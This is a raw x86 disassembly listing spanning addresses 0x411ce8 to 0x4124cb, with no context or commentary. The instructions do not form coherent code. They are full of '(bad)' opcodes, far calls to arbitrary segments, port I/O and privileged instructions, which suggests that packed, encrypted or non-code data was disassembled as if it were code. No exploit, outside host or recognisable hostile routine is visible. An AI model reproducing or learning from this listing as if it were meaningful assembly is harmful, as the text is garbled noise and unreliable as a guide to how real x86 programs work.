  411ce8:	xchg   esp,eax
  411ce9:	or     esp,ecx
  411ceb:	gs (bad) 
  411ced:	in     al,0x40
  411cef:	sar    DWORD PTR [esp+edx*1+0x761a39a],0x1e
  411cf7:	inc    esi
  411cf8:	jbe    0x411d23
  411cfa:	pop    ds
  411cfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411cfc:	push   esi
  411cfd:	jns    0x411d17
  411cff:	lds    edx,FWORD PTR [edx+0x4d]
  411d02:	mov    cl,0x7b
  411d04:	push   es
  411d05:	fwait
  411d06:	xchg   DWORD PTR [ebx+edx*4+0x6a189ad7],ebx
  411d0d:	and    al,BYTE PTR [edi+ecx*8]
  411d10:	pop    ecx
  411d11:	or     esp,DWORD PTR [esi-0x1b]
  411d14:	(bad)  
  411d15:	xchg   ebx,eax
  411d16:	jp     0x411d37
  411d18:	mov    edi,esp
  411d1a:	call   0x4136:0x64cf69b3
  411d21:	sub    eax,0x9f1a448
  411d26:	lods   eax,DWORD PTR ds:[esi]
  411d27:	add    al,0xce
  411d29:	cli    
  411d2a:	call   0xf60e:0x37330925
  411d31:	sbb    DWORD PTR [ebp-0x75f423a5],ebx
  411d37:	and    ecx,DWORD PTR [ebp-0x275243c4]
  411d3d:	jo     0x411cdc
  411d3f:	push   edi
  411d40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d41:	lock shl BYTE PTR [esi-0x334d80ce],1
  411d48:	cmp    eax,0x2febbaf3
  411d4d:	and    BYTE PTR [edx-0x420258bc],bl
  411d53:	pop    ss
  411d54:	cmp    BYTE PTR [ebp-0x301d4663],cl
  411d5a:	mov    bl,0x6a
  411d5c:	ret    
  411d5d:	push   esp
  411d5e:	mov    ch,cl
  411d60:	mov    cx,0xa789
  411d64:	ja     0x411d66
  411d66:	out    dx,al
  411d67:	sbb    ecx,edi
  411d69:	adc    edx,DWORD PTR [ecx-0x4d]
  411d6c:	mov    dl,0x3e
  411d6e:	mov    eax,0x2c6198ad
  411d73:	scas   eax,DWORD PTR es:[edi]
  411d74:	pop    ebx
  411d75:	or     esi,DWORD PTR [edx+0x957d465]
  411d7b:	dec    ebp
  411d7c:	jnp    0x411d72
  411d7e:	xchg   ebp,eax
  411d7f:	add    BYTE PTR [ebx+0x6ca7aa50],ch
  411d85:	sub    dh,BYTE PTR [edx+eiz*4-0x8b2f4bf]
  411d8c:	mov    dh,0xb4
  411d8e:	push   0x21
  411d90:	and    al,0x4d
  411d92:	xchg   BYTE PTR [esp+ecx*1+0x4e],al
  411d96:	call   0x7ece:0x42d4cf1d
  411d9d:	or     ecx,esp
  411d9f:	(bad)  
  411da0:	imul   eax,DWORD PTR ds:0x5f2f217b,0xedb5c0ee
  411daa:	adc    BYTE PTR [ebx+0x6a4a3a65],bl
  411db0:	mov    eax,ds:0x3a71f5d
  411db5:	add    DWORD PTR [eax+ebp*1],0xffffffc2
  411db9:	pushf  
  411dba:	mov    cl,0x87
  411dbc:	mov    dl,0x7e
  411dbe:	aaa    
  411dbf:	cs pushf 
  411dc1:	loop   0x411de9
  411dc3:	call   0x34b227ff
  411dc8:	shr    BYTE PTR [eax],0xfa
  411dcb:	adc    eax,0x7817eb3e
  411dd0:	mov    dl,0x48
  411dd2:	pop    es
  411dd3:	cdq    
  411dd4:	pop    ss
  411dd5:	sub    al,0x96
  411dd7:	push   es
  411dd8:	dec    edi
  411dd9:	adc    eax,0xcb098889
  411dde:	cdq    
  411ddf:	push   esi
  411de0:	ret    0x989e
  411de3:	fs scas al,BYTE PTR es:[edi]
  411de5:	xor    al,0x12
  411de7:	je     0x411d9b
  411de9:	mov    WORD PTR fs:[ecx-0x585edba6],gs
  411df0:	mov    ah,BYTE PTR [edx+0x582c066d]
  411df6:	push   ds
  411df7:	and    DWORD PTR [edx-0x3f336e02],esi
  411dfd:	in     al,0x2e
  411dff:	repnz dec ebp
  411e01:	and    esi,edi
  411e03:	mov    bh,0x70
  411e05:	or     bl,dl
  411e07:	xchg   edx,eax
  411e08:	fucomi st,st(6)
  411e0a:	dec    esp
  411e0b:	pop    edi
  411e0c:	idiv   BYTE PTR [ebx]
  411e0e:	pop    eax
  411e0f:	leave  
  411e10:	lods   eax,DWORD PTR ds:[esi]
  411e11:	ret    0xd85
  411e14:	xor    ebx,DWORD PTR [ebx+0x5d3b7cf2]
  411e1a:	arpl   WORD PTR [ecx-0x2d],bx
  411e1d:	sbb    al,0x64
  411e1f:	(bad)  
  411e20:	cmp    dh,cl
  411e22:	mov    edi,0x9a0768ff
  411e27:	or     dh,BYTE PTR [ebx]
  411e29:	sbb    ebx,DWORD PTR [esp+eiz*4+0x5422448f]
  411e30:	mov    dl,0xe0
  411e32:	sub    ebp,DWORD PTR [esi]
  411e34:	sbb    al,0xd3
  411e36:	lock inc esi
  411e38:	or     eax,0xe9267d05
  411e3d:	mov    ch,0x5a
  411e3f:	popf   
  411e40:	aaa    
  411e41:	jmp    0x411dd3
  411e43:	push   esi
  411e44:	mov    dl,0x84
  411e46:	xchg   ebx,eax
  411e47:	pop    edi
  411e48:	jno    0x411def
  411e4a:	daa    
  411e4b:	sub    eax,0xdce50be8
  411e50:	add    BYTE PTR gs:[esi-0x12],0xf0
  411e55:	into   
  411e56:	fwait
  411e57:	int3   
  411e58:	out    0xa6,eax
  411e5a:	push   ss
  411e5b:	das    
  411e5c:	pusha  
  411e5d:	pop    es
  411e5e:	bound  esp,QWORD PTR [ecx-0x4943e8af]
  411e64:	jmp    0x411dee
  411e66:	lods   al,BYTE PTR ds:[esi]
  411e67:	fcomp  DWORD PTR [ebx+0x9f64a11]
  411e6d:	xchg   edx,eax
  411e6e:	call   0xaa05:0xa6f12102
  411e75:	daa    
  411e76:	arpl   di,bx
  411e78:	pop    esp
  411e79:	jno    0x411e19
  411e7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e7d:	mov    eax,ds:0xa412a133
  411e82:	adc    al,0x9f
  411e84:	mov    dl,0x58
  411e86:	mov    al,ds:0xad66cf21
  411e8b:	mov    bh,0xf9
  411e8d:	or     eax,DWORD PTR [ecx+0x15]
  411e90:	pop    esp
  411e91:	pop    ebp
  411e92:	fwait
  411e93:	cwde   
  411e94:	xchg   edi,eax
  411e95:	mov    DWORD PTR [edx-0x1b1ddc5],ebx
  411e9b:	mov    ecx,0xa7f27e49
  411ea0:	adc    eax,0x3374d76b
  411ea5:	pop    ss
  411ea6:	and    bh,BYTE PTR [eax-0x7f658337]
  411eac:	je     0x411ebe
  411eae:	aad    0x19
  411eb0:	inc    edi
  411eb1:	mov    ebp,0xd421a797
  411eb6:	ret    0x200
  411eb9:	jge    0x411ef6
  411ebb:	cs mov dl,0xcb
  411ebe:	xchg   ebx,eax
  411ebf:	pusha  
  411ec0:	fwait
  411ec1:	sbb    al,BYTE PTR gs:[esi-0x51]
  411ec5:	or     eax,DWORD PTR [esi]
  411ec7:	sbb    cl,BYTE PTR [ebx]
  411ec9:	xchg   edx,eax
  411eca:	ret    0x67ee
  411ecd:	shr    DWORD PTR ds:0xe61d44df,0x67
  411ed4:	repnz or eax,DWORD PTR [esi-0x8]
  411ed8:	mov    ah,0x58
  411eda:	pop    esi
  411edb:	ss mov dl,0x2c
  411ede:	cwde   
  411edf:	cmp    cl,BYTE PTR [ecx+0x39ea1791]
  411ee5:	je     0x411e8c
  411ee7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ee8:	imul   esp,ecx,0x14
  411eeb:	sti    
  411eec:	shl    edx,cl
  411eee:	xchg   esi,eax
  411eef:	lods   al,BYTE PTR ds:[esi]
  411ef0:	mov    dl,0xcd
  411ef2:	xchg   ebx,eax
  411ef3:	das    
  411ef4:	in     eax,0xdd
  411ef6:	imul   esp,DWORD PTR [ebx-0x3af8f4e0],0x6f0ac28e
  411f00:	push   es
  411f01:	adc    ah,BYTE PTR [edi+0x39005c16]
  411f07:	push   ebx
  411f08:	(bad)  [edx]
  411f0a:	and    eax,0xaa8a5614
  411f0f:	aas    
  411f10:	mov    bl,0xb
  411f12:	outs   dx,DWORD PTR ds:[esi]
  411f13:	push   esp
  411f14:	jns    0x411eb3
  411f16:	les    ecx,FWORD PTR [esi+0x3f]
  411f19:	sbb    DWORD PTR [edx+0x6c95a9ca],ebx
  411f1f:	cmp    cl,BYTE PTR [ebp+edx*8+0x33]
  411f23:	dec    ecx
  411f24:	xor    ecx,DWORD PTR [ebx]
  411f26:	add    edx,edx
  411f28:	shr    BYTE PTR [edx+0x7f],0x18
  411f2c:	push   es
  411f2d:	neg    BYTE PTR [edx+0x474e9007]
  411f33:	and    BYTE PTR [eax-0x605102d0],bh
  411f39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f3a:	xor    edx,DWORD PTR ds:0xb8fec032
  411f40:	cmp    cl,BYTE PTR [esp+edx*4]
  411f43:	xchg   esi,eax
  411f44:	mov    BYTE PTR [esi-0x27],cl
  411f47:	out    0x20,eax
  411f49:	ins    BYTE PTR es:[edi],dx
  411f4a:	sub    bh,BYTE PTR [ebx-0x16]
  411f4d:	or     ecx,esp
  411f4f:	dec    esp
  411f50:	retf   
  411f51:	add    eax,DWORD PTR [edi-0x5b4909fd]
  411f57:	inc    esp
  411f58:	sbb    al,0xb
  411f5a:	jg     0x411eeb
  411f5c:	jge    0x411f3f
  411f5e:	jge    0x411f5d
  411f60:	jns    0x411f6d
  411f62:	mov    eax,ds:0xfc1d8645
  411f67:	jae    0x411f26
  411f69:	xor    DWORD PTR [esi+0x5a7895ca],eax
  411f6f:	pop    eax
  411f70:	cs xchg edx,eax
  411f72:	or     DWORD PTR [ebx],edx
  411f74:	or     BYTE PTR fs:[edx-0x25db432d],cl
  411f7b:	test   DWORD PTR [ebp+0x3b],edx
  411f7e:	cmp    BYTE PTR [ebp-0x23],0x84
  411f82:	call   0xb9eb:0xd7428429
  411f89:	loopne 0x411fd9
  411f8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f8c:	cs sub al,0x95
  411f8f:	das    
  411f90:	je     0x411ff8
  411f92:	sub    dh,BYTE PTR [eax]
  411f94:	or     cl,dh
  411f96:	cdq    
  411f97:	je     0x411fd6
  411f99:	inc    edi
  411f9a:	push   ds
  411f9b:	icebp  
  411f9c:	ds repz cmc 
  411f9f:	stos   BYTE PTR es:[edi],al
  411fa0:	jae    0x411fad
  411fa2:	push   0x3ad5be0b
  411fa7:	fadd   st,st(1)
  411fa9:	arpl   WORD PTR [edx+0x18b26720],bx
  411faf:	out    0xed,eax
  411fb1:	push   ebx
  411fb2:	(bad)  
  411fb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fb4:	pop    edx
  411fb5:	fld    QWORD PTR [edi+0x5d]
  411fb8:	xor    al,0x61
  411fba:	add    bl,BYTE PTR [eax+0x1ae8bf09]
  411fc0:	mov    cl,0xf5
  411fc2:	int    0x80
  411fc4:	nop
  411fc5:	in     eax,dx
  411fc6:	jmp    FWORD PTR [edi]
  411fc8:	dec    esi
  411fc9:	aad    0x54
  411fcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411fcc:	or     al,0x40
  411fce:	jmp    0x411fef
  411fd0:	push   0x40b3cf58
  411fd5:	add    DWORD PTR [edx+0x5b6db5b8],ebx
  411fdb:	sbb    eax,DWORD PTR [eax+0x5ea7b474]
  411fe1:	pushf  
  411fe2:	sbb    DWORD PTR [eax],esp
  411fe4:	push   0x47
  411fe6:	out    dx,eax
  411fe7:	pop    esi
  411fe8:	dec    esi
  411fe9:	(bad)  
  411fea:	mov    esi,0x9da071ee
  411fef:	not    BYTE PTR [esi-0x5d]
  411ff2:	shl    BYTE PTR ds:[edx],0x70
  411ff6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ff7:	lock repnz or esp,edx
  411ffb:	sub    ch,0x8c
  411ffe:	add    esp,DWORD PTR [eax+ecx*8]
  412001:	xchg   edi,eax
  412002:	call   0xc39b:0x9110db32
  412009:	mov    eax,ds:0x3e40a7c4
  41200e:	rol    BYTE PTR [esi-0xadac22d],1
  412014:	mov    esp,0x353edafa
  412019:	imul   eax,edi,0x3beb3833
  41201f:	push   ss
  412020:	lea    ecx,[ebx]
  412022:	jle    0x412009
  412024:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412025:	(bad)  
  412026:	leave  
  412027:	call   0xce0:0xe0a33ea1
  41202e:	add    DWORD PTR [eax],edx
  412030:	xchg   esp,eax
  412031:	test   DWORD PTR ds:0xf87c32f3,ecx
  412037:	aas    
  412038:	and    DWORD PTR [edi],eax
  41203a:	inc    eax
  41203b:	(bad)  
  41203c:	push   esp
  41203d:	out    dx,al
  41203e:	xor    ah,BYTE PTR [eax+0x1f9abbcd]
  412044:	cmp    al,0x8b
  412046:	mov    cl,0x59
  412048:	xchg   ebx,eax
  412049:	jecxz  0x41202e
  41204b:	cwde   
  41204c:	lds    esi,FWORD PTR [eax]
  41204e:	cdq    
  41204f:	xchg   esi,eax
  412050:	loope  0x412027
  412052:	xchg   esi,eax
  412053:	dec    eax
  412054:	add    bh,BYTE PTR [eax+0x3cb26510]
  41205a:	push   edx
  41205b:	sbb    BYTE PTR [edi],dh
  41205d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41205e:	addr16 mov ecx,0x63a00a6d
  412064:	dec    ebx
  412065:	mov    al,0x2f
  412067:	dec    eax
  412068:	jge    0x4120d4
  41206a:	outs   dx,BYTE PTR ds:[esi]
  41206b:	and    al,0xae
  41206d:	or     DWORD PTR [ebx-0xc6c01f9],0x1632bb2c
  412077:	push   ecx
  412078:	mov    dl,0xa
  41207a:	adc    ah,BYTE PTR [ebx-0x1a9ec620]
  412080:	mov    dl,0x86
  412082:	outs   dx,DWORD PTR ds:[esi]
  412083:	inc    eax
  412084:	adc    al,0xc8
  412086:	ss pop edx
  412088:	xchg   esp,eax
  412089:	add    eax,0xed46e7dd
  41208e:	std    
  41208f:	mov    eax,ds:0x6881cb5d
  412094:	out    0xc9,eax
  412096:	call   0x8dbb:0x57b1e4fe
  41209d:	je     0x4120d3
  41209f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120a0:	xchg   DWORD PTR [eax],esp
  4120a2:	sbb    cl,0x91
  4120a5:	dec    ebx
  4120a6:	xchg   esi,edx
  4120a8:	mov    al,0x42
  4120aa:	mov    edi,0x1be173f4
  4120af:	(bad)  
  4120b0:	movntq QWORD PTR [esi+0x23b487a7],mm5
  4120b7:	pop    edi
  4120b8:	sbb    al,0x20
  4120ba:	mov    esp,0x144db20f
  4120bf:	hlt    
  4120c0:	mov    bl,0x59
  4120c2:	sub    al,0x75
  4120c4:	mov    esp,0xd5b0c70b
  4120c9:	or     BYTE PTR [ebx-0x43],cl
  4120cc:	xchg   ebp,eax
  4120cd:	mov    eax,ds:0xc7b2e87c
  4120d2:	sub    eax,0x6d141499
  4120d7:	loop   0x4120ab
  4120d9:	or     ebp,DWORD PTR [esi+0x6429ff1c]
  4120df:	lods   eax,DWORD PTR ds:[esi]
  4120e0:	leave  
  4120e1:	sbb    bl,BYTE PTR [ebx-0x193e039b]
  4120e7:	pop    ds
  4120e8:	pop    esi
  4120e9:	cmp    bl,BYTE PTR [esi+0x50]
  4120ec:	or     edx,DWORD PTR ds:0x72e619c4
  4120f2:	adc    al,0x73
  4120f4:	and    al,BYTE PTR [ecx-0x1d4b6566]
  4120fa:	jmp    0xc7f7:0x99bccd89
  412101:	mov    edi,0xcb6855fb
  412106:	pop    edi
  412107:	out    dx,al
  412108:	out    dx,eax
  412109:	or     edx,DWORD PTR [ecx]
  41210b:	je     0x4120e2
  41210d:	cli    
  41210e:	call   0x9e44ea14
  412113:	pop    ebp
  412114:	mov    ds:0x72a581ec,al
  412119:	repz pop ds
  41211b:	and    al,0xd3
  41211d:	ss jns 0x41218f
  412120:	xor    bl,BYTE PTR [esi-0x74]
  412123:	aam    0x69
  412125:	hlt    
  412126:	dec    esi
  412127:	xchg   ecx,eax
  412128:	mov    cl,0x90
  41212a:	xchg   esi,eax
  41212b:	adc    eax,ebx
  41212d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41212e:	(bad)  
  41212f:	sbb    al,0x79
  412131:	push   cs
  412132:	push   edx
  412133:	push   es
  412134:	rcl    BYTE PTR [edi],1
  412136:	cmp    ah,BYTE PTR [edi]
  412138:	push   esi
  412139:	push   ebp
  41213a:	loope  0x4120c5
  41213c:	mov    dl,0xf2
  41213e:	cwde   
  41213f:	or     al,0xf1
  412141:	popa   
  412142:	shl    BYTE PTR [edx-0xd],cl
  412145:	or     edi,DWORD PTR [ecx+esi*2-0x73]
  412149:	call   0x9ba4:0x10bd0d00
  412150:	in     al,dx
  412151:	adc    eax,0x2d32ff22
  412156:	xor    DWORD PTR [ebx-0x5b3074d1],esp
  41215c:	data16 ins BYTE PTR es:[edi],dx
  41215e:	xchg   ebx,eax
  41215f:	xchg   ebp,eax
  412160:	inc    esi
  412161:	adc    ch,BYTE PTR [edx-0x51]
  412164:	xchg   edi,eax
  412165:	pop    es
  412166:	nop
  412167:	xor    eax,ecx
  412169:	test   eax,0xf5b22cb6
  41216e:	mov    DWORD PTR [edi+0x3f],edi
  412171:	sbb    eax,0xb2251fe
  412176:	pop    ebx
  412177:	popf   
  412178:	and    edi,DWORD PTR [ecx-0x4f]
  41217b:	ror    DWORD PTR [edi+0x24349974],1
  412181:	rcl    DWORD PTR [esi],0x17
  412184:	xchg   edx,eax
  412185:	fwait
  412186:	imul   esi,edx,0x53a20b7a
  41218c:	push   ss
  41218d:	pushf  
  41218e:	cdq    
  41218f:	mov    cl,0xb
  412191:	aaa    
  412192:	xchg   DWORD PTR [edx+0x36],ebx
  412195:	mov    ds:0x6bb307be,eax
  41219a:	pop    ecx
  41219b:	sub    BYTE PTR [edi-0x108ba5f3],bl
  4121a1:	adc    eax,0xcced979
  4121a6:	or     BYTE PTR [esi],0xf4
  4121a9:	fwait
  4121aa:	cld    
  4121ab:	ins    DWORD PTR es:[edi],dx
  4121ac:	and    al,0xc5
  4121ae:	call   0xcc8c:0x15e36b45
  4121b5:	or     BYTE PTR [ebx],dl
  4121b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121b8:	or     eax,0xc7588d44
  4121bd:	shl    ecx,cl
  4121bf:	std    
  4121c0:	mov    dl,0xad
  4121c2:	add    al,0x3
  4121c4:	fild   DWORD PTR [edi]
  4121c6:	and    BYTE PTR [eax+ecx*2],0x7a
  4121ca:	xor    eax,0x8bb63ba7
  4121cf:	test   eax,0x2a4d218e
  4121d4:	mov    dl,0x7d
  4121d6:	add    eax,DWORD PTR [ecx]
  4121d8:	test   DWORD PTR [ebp+0x7d5c1052],esi
  4121de:	int    0x55
  4121e0:	fwait
  4121e1:	or     edx,edi
  4121e3:	out    0x60,al
  4121e5:	pop    eax
  4121e6:	jbe    0x41216f
  4121e8:	leave  
  4121e9:	xchg   esp,eax
  4121ea:	and    cl,BYTE PTR [eax-0x4e]
  4121ed:	fwait
  4121ee:	sbb    ecx,DWORD PTR [ecx]
  4121f0:	push   cs
  4121f1:	fmul   QWORD PTR [ecx-0x29f4f8ab]
  4121f7:	push   0xc91ef8e4
  4121fc:	ins    DWORD PTR es:[edi],dx
  4121fd:	xchg   esp,eax
  4121fe:	call   0x95c4:0xaad38eea
  412205:	dec    eax
  412206:	mov    al,ds:0x527e43a3
  41220b:	lods   eax,DWORD PTR ds:[esi]
  41220c:	inc    edx
  41220d:	hlt    
  41220e:	pop    edx
  41220f:	and    dh,dh
  412211:	mov    edx,DWORD PTR [esi-0x54fd8a59]
  412217:	call   0xb08f:0x7e487d30
  41221e:	cdq    
  41221f:	test   al,0xdc
  412221:	clc    
  412222:	add    eax,DWORD PTR [edi-0x48e88a97]
  412228:	fdivp  st(6),st
  41222a:	dec    ecx
  41222b:	aas    
  41222c:	mov    ch,0xde
  41222e:	ja     0x4121d7
  412230:	mov    ds:0x79fed5d1,eax
  412235:	xchg   edx,eax
  412236:	les    eax,FWORD PTR [edi]
  412238:	mov    dl,0xd4
  41223a:	sub    edx,DWORD PTR [edx+0x7b]
  41223d:	nop
  41223e:	loope  0x41226a
  412240:	(bad)  [ebx]
  412242:	or     DWORD PTR [ebx-0x7b],esi
  412245:	and    DWORD PTR [edi+0x77],0x459ad011
  41224c:	add    DWORD PTR [eax],ebx
  41224e:	nop
  41224f:	repz xor al,BYTE PTR [edi+0x34]
  412253:	test   al,0x6f
  412255:	jmp    0x412243
  412257:	xchg   esp,eax
  412258:	mov    ch,0x5b
  41225a:	pop    edx
  41225b:	not    ecx
  41225d:	fcom   QWORD PTR [edi-0x44fb4d31]
  412263:	das    
  412264:	adc    al,0x8a
  412266:	rcl    ah,1
  412268:	pop    ds
  412269:	or     ecx,DWORD PTR ds:0xef6250f5
  41226f:	push   0x666601c8
  412274:	mov    ch,0x85
  412276:	or     DWORD PTR [ebx+0x56caa9f8],ebx
  41227c:	push   ebx
  41227d:	push   ds
  41227e:	jb     0x412227
  412280:	sub    ch,bl
  412282:	add    ebx,DWORD PTR [eax-0x5e]
  412285:	or     DWORD PTR [edx],ecx
  412287:	imul   esi,DWORD PTR [edx-0x613d92f6],0x4cd13ddb
  412291:	or     ecx,DWORD PTR [ebx-0x5e410348]
  412297:	adc    esi,edi
  412299:	xchg   ecx,eax
  41229a:	call   0x75df:0x8e18df33
  4122a1:	sar    DWORD PTR [eax],cl
  4122a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122a4:	push   cs
  4122a5:	xchg   edx,eax
  4122a6:	jge    0x4122d5
  4122a8:	dec    ebp
  4122a9:	jmp    0x38f1c530
  4122ae:	mov    bh,0xb5
  4122b0:	fisttp DWORD PTR [ecx]
  4122b2:	pop    esp
  4122b3:	addr16 retfw 
  4122b6:	add    esp,DWORD PTR [edi+0x14c22ffa]
  4122bc:	lds    eax,FWORD PTR [ebx]
  4122be:	dec    edi
  4122bf:	int    0xb2
  4122c1:	clc    
  4122c2:	repnz loopne 0x412280
  4122c5:	ins    DWORD PTR es:[edi],dx
  4122c6:	inc    ebx
  4122c7:	jmp    0x3f7532ad
  4122cc:	mov    esp,0x72196e06
  4122d1:	xchg   edx,eax
  4122d2:	fidiv  WORD PTR ss:[esi-0x59b26abd]
  4122d9:	pop    ebx
  4122da:	mov    eax,ds:0xf997bc1e
  4122df:	and    eax,0x11cc0be5
  4122e4:	call   0xb2f4dbdb
  4122e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122ea:	loop   0x412334
  4122ec:	sbb    DWORD PTR [edi+0x5],edx
  4122ef:	jbe    0x4122b8
  4122f1:	or     cl,cl
  4122f3:	pop    ds
  4122f4:	outs   dx,BYTE PTR ds:[esi]
  4122f5:	adc    al,0xb3
  4122f7:	dec    edi
  4122f8:	in     al,dx
  4122f9:	iret   
  4122fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122fb:	ins    BYTE PTR es:[edi],dx
  4122fc:	mov    dl,0x17
  4122fe:	adc    eax,0xede24c5
  412303:	mov    ecx,DWORD PTR ds:0x8c34010c
  412309:	jnp    0x4122da
  41230b:	or     BYTE PTR ds:0x7997e5f5,dl
  412311:	add    eax,0xbeb28673
  412316:	and    ch,BYTE PTR [esi]
  412318:	test   DWORD PTR [edi+0x786a99f3],ecx
  41231e:	popa   
  41231f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412320:	jl     0x41233f
  412322:	mov    eax,0x776a1737
  412327:	sub    DWORD PTR [esi+esi*2+0x4b96b480],edi
  41232e:	cmc    
  41232f:	js     0x4122cf
  412331:	ds pusha 
  412333:	mov    ecx,0x677bc082
  412338:	add    ax,0x8d81
  41233c:	fdivr  QWORD PTR [esi-0x66]
  41233f:	fisttp QWORD PTR [edi+0x1bfa69ee]
  412345:	loope  0x412340
  412347:	test   eax,0x872832a3
  41234c:	xor    ah,bh
  41234e:	inc    ecx
  41234f:	clc    
  412350:	or     al,0xcd
  412352:	call   0xf74d:0x756b93f
  412359:	rcl    eax,1
  41235b:	pop    ds
  41235c:	(bad)  
  41235d:	or     eax,DWORD PTR [ebp-0x22]
  412360:	fbld   TBYTE PTR [edi-0x5d29dbd8]
  412366:	call   0xc2ea:0x90b4d01b
  41236d:	imul   ebp,DWORD PTR [ebp-0x30],0xffffffeb
  412371:	or     ecx,DWORD PTR [ebx-0x71b1482f]
  412377:	push   cs
  412378:	sbb    dl,BYTE PTR [edi-0x78]
  41237b:	push   0xe
  41237d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41237e:	xchg   ebp,eax
  41237f:	xor    BYTE PTR [edx-0x75],al
  412382:	rcl    BYTE PTR [esi],0xc1
  412385:	jl     0x4123f2
  412387:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412388:	sbb    DWORD PTR [ebx],ebx
  41238a:	fwait
  41238b:	xchg   ebx,eax
  41238c:	pop    ebp
  41238d:	and    esi,esi
  41238f:	sub    eax,0x35a4d0b1
  412394:	mov    bh,0x6b
  412396:	jo     0x4123bf
  412398:	ret    
  412399:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41239a:	cld    
  41239b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41239c:	xor    BYTE PTR ds:0x6e6bdb0a,cl
  4123a2:	mov    dl,0xfa
  4123a4:	scas   al,BYTE PTR es:[edi]
  4123a5:	cmp    ecx,DWORD PTR [ecx]
  4123a7:	bound  esi,QWORD PTR [edx-0x56]
  4123aa:	jb     0x4123aa
  4123ac:	out    0xf1,eax
  4123ae:	adc    DWORD PTR [edi-0x9cbfb90],esp
  4123b4:	leave  
  4123b5:	pop    ss
  4123b6:	rcr    cl,cl
  4123b8:	mov    ch,0xbd
  4123ba:	into   
  4123bb:	inc    eax
  4123bc:	loope  0x4123d9
  4123be:	fimul  DWORD PTR [eax-0x66]
  4123c1:	mov    ?,edi
  4123c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123c4:	js     0x412360
  4123c6:	out    0x2f,eax
  4123c8:	repnz fnstsw WORD PTR [ebx-0x780c4d05]
  4123cf:	cmp    ebx,0xd7d5a727
  4123d5:	pop    es
  4123d6:	add    edi,DWORD PTR [ebp-0xb]
  4123d9:	addr16 inc esi
  4123db:	lock ret 
  4123dd:	jae    0x412363
  4123df:	cwd    
  4123e1:	scas   eax,DWORD PTR es:[edi]
  4123e2:	xchg   ebx,eax
  4123e3:	test   BYTE PTR ds:0x8e329b89,0xeb
  4123ea:	jb     0x4123a4
  4123ec:	and    cl,BYTE PTR [ebx]
  4123ee:	mov    WORD PTR [eax-0x22747733],fs
  4123f4:	pop    ebx
  4123f5:	fstp   DWORD PTR [edx-0x5dba8394]
  4123fb:	stc    
  4123fc:	sub    eax,0x77a9905f
  412401:	cld    
  412402:	mov    bh,0xb0
  412404:	mov    bl,0x97
  412406:	repz and BYTE PTR [edi+edi*8+0x7058669d],0x9a
  41240f:	push   ds
  412410:	(bad)  
  412411:	push   eax
  412412:	inc    eax
  412413:	es jne 0x412470
  412416:	popa   
  412417:	popf   
  412418:	jle    0x412452
  41241a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41241b:	fdivr  DWORD PTR [ebp-0x6d69cc57]
  412421:	outs   dx,BYTE PTR ds:[esi]
  412422:	mov    WORD PTR [ecx],ss
  412424:	scas   eax,DWORD PTR es:[edi]
  412425:	stos   DWORD PTR es:[edi],eax
  412426:	call   0xbb7b:0x627744b
  41242d:	sub    esi,esp
  41242f:	mov    ebx,DWORD PTR [eax+0x5f]
  412432:	xchg   edx,eax
  412433:	mov    al,ds:0x67c4933b
  412438:	jecxz  0x41247b
  41243a:	mov    eax,ds:0xf0098f53
  41243f:	pushf  
  412440:	xor    esi,DWORD PTR ds:[edi-0x59]
  412444:	fldenv [edi+0x14132750]
  41244a:	cmp    DWORD PTR [ebx+0x777662c9],esp
  412450:	mov    eax,0x4393c1cb
  412455:	ficomp WORD PTR [edx-0x6244c826]
  41245b:	stos   DWORD PTR es:[edi],eax
  41245c:	mov    cl,0xc8
  41245e:	jno    0x412407
  412460:	mov    al,0xed
  412462:	push   edx
  412463:	jge    0x41243c
  412465:	sbb    dh,BYTE PTR [edx*8+0x2b3ef6b1]
  41246c:	push   ds
  41246d:	cmp    DWORD PTR [esi+0x6f],0xa70e0245
  412474:	retw   
  412476:	inc    ebx
  412477:	dec    ecx
  412478:	(bad)  
  41247a:	xor    esp,DWORD PTR [eax+0x55a3d3b2]
  412480:	mov    edx,0x5a9cccf7
  412485:	or     eax,edx
  412487:	call   0x27f1:0xa12ec10c
  41248e:	call   0x43ca:0x3af1bf1b
  412495:	xchg   esp,eax
  412496:	sbb    BYTE PTR [eax-0x58c9e2e1],bh
  41249c:	and    BYTE PTR [esi+0x29],bh
  41249f:	lods   eax,DWORD PTR ds:[esi]
  4124a0:	sub    BYTE PTR [edx-0x63],ah
  4124a3:	in     al,dx
  4124a4:	test   BYTE PTR [eax-0x31fda07d],ah
  4124aa:	cld    
  4124ab:	jmp    0x896c:0xd8510b15
  4124b2:	lds    eax,FWORD PTR [esi]
  4124b4:	jnp    0x4124e4
  4124b6:	call   0x9159:0xb7a20b41
  4124bd:	inc    edx
  4124be:	fstp   DWORD PTR [edx+0x5a]
  4124c1:	(bad)  
  4124c2:	pop    ebp
  4124c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124c4:	call   0x9bfb:0xc48d07c3
  4124cb:	xor    BYTE PTR [edx-0x49d8dcf3],al
